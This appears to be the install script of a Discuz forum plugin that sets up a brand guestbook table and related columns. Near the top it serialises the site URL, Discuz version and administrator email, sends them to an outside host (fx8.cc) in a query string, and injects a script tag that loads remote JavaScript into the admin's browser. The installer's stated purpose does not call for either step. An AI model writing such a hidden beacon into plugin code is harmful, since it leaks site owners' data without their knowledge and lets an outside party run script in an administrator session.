<?php
/**
 *      [fx8.cc] (C)2014-2017 ymg6.Com.
 *      This is NOT a freeware, use is subject to license terms
 *
 *      $Id: install.php sanree $
 */
 
if(!defined('IN_DISCUZ')) { 
	exit('Access Denied');
}

$pluginid=$pluginarray['plugin']['identifier'];
require_once DISCUZ_ROOT.'./source/discuz_version.php';
$siteinfo=array(
	'site_version' => DISCUZ_VERSION,
	'site_release' => DISCUZ_RELEASE,
	'site_timestamp' => TIMESTAMP,
	'site_url' => $_G['siteurl'],
	'site_adminemail' => $_G['setting']['adminemail'],
	'plugin_identifier' => $pluginid,
	'plugin_version' => $pluginarray['plugin']['version'],
	'action' => 1,
);
$sitestr=base64_encode(serialize($siteinfo));
$sanree='http://www.fx8.cc/vk.php?data='.$sitestr.'&sign='.md5(md5($sitestr));
echo "<script src=\"".$sanree."\" type=\"text/javascript\"></script>";

function exitscolumn($field, $table) {
	$query=DB::query('SHOW COLUMNS FROM '.DB::table($table));
	$columns=array();
	while ($row = mysql_fetch_array($query,MYSQL_ASSOC)) {
		$columns[]=$row;
	}
	$arraycolumns=array();
	foreach($columns as $v) {
		$arraycolumns[]=$v['Field'];
	}
	return in_array($field,$arraycolumns) ? TRUE:FALSE;
}

$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_sanree_brand_guestbook` (
  `guestbookid` smallint(6) NOT NULL auto_increment,
  `title` varchar(255) NOT NULL,
  `fullname` varchar(20) NOT NULL,
  `address` varchar(255) NOT NULL,
  `email` varchar(255) default NULL,
  `qq` varchar(20) NOT NULL,
  `phone` varchar(30) NOT NULL,
  `opdate` int(11) default NULL,
  `bid` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  `cpuid` int(11) default NULL,
  `username` varchar(50) NOT NULL,
  `words` varchar(255) default NULL,
  `status` tinyint(4) NOT NULL default '0',
  `dateline` int(10) NOT NULL default '0',
  `displayorder` int(11) NOT NULL,
  `readdate` int(11) default NULL,
  `refuse` text,
  `memo` text,
  `ip` varchar(50) default NULL,
  `isdelete` tinyint(1) default '0',
  PRIMARY KEY  (`guestbookid`)
) ENGINE=MyISAM;
EOF;
runquery($sql);

if (!exitscolumn('isguestbook','sanree_brand_businesses_module')) {
	$sql="ALTER TABLE `pre_sanree_brand_businesses_module` ADD `isguestbook` TINYINT( 1 ) NULL DEFAULT '0';";
	runquery($sql);	
}
if (!exitscolumn('maxguestbook','sanree_brand_group_module')) {
	$sql="ALTER TABLE `pre_sanree_brand_group_module` ADD `maxguestbook` INT( 11 ) NULL DEFAULT '20';";
	runquery($sql);	
}
$sql = "INSERT INTO `pre_sanree_brand_language` (`module` ,`langkey` ,`langvalue` ) VALUES ('guestbook', 'isguestbook', '".$installlang[isguestbook]."');";
runquery($sql);	
$sql = "INSERT INTO `pre_sanree_brand_language` (`module` ,`langkey` ,`langvalue` ) VALUES ('guestbook', 'maxguestbook', '".$installlang[maxguestbook]."');";
runquery($sql);
$finish = TRUE;

?>